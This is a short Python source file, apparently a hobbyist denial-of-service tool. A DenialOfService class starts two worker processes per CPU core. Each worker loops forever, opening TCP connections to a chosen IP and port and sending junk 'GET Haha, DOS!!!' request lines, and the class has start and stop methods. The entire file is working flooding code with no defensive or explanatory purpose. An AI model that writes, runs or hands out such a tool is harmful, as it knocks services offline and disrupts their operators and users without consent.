import multiprocessing
import os
import socket
from time import sleep

running = True


class DenialOfService:
    ip = str
    port = int
    running = True

    def __init__(self, console):

        self.console = console

    def start(self):
        self.procs = []
        for i in range(os.cpu_count() * 2):

            proc = multiprocessing.Process(target=self.dos)
            self.procs.append(proc)
            proc.daemon=True
            proc.start()
        print(self.procs.__len__())

    def stop(self):
        for i in self.procs:
            i.terminate()
            self.console.log(str(i) + " Terminiert")

    def setIp(self, ip):
        self.ip = ip

    def setPort(self, port):
        self.port = port

    def dos(self):
        while self.running:
            mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                mysocket.connect((self.ip, self.port))
                mysocket.send(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"))
                mysocket.sendto(str.encode("GET " + "Haha, DOS!!!" + "HTTP/1.1 \r\n"), (self.ip, self.port))
                print("dos")
            except socket.error:
                sleep(3)
            mysocket.close()
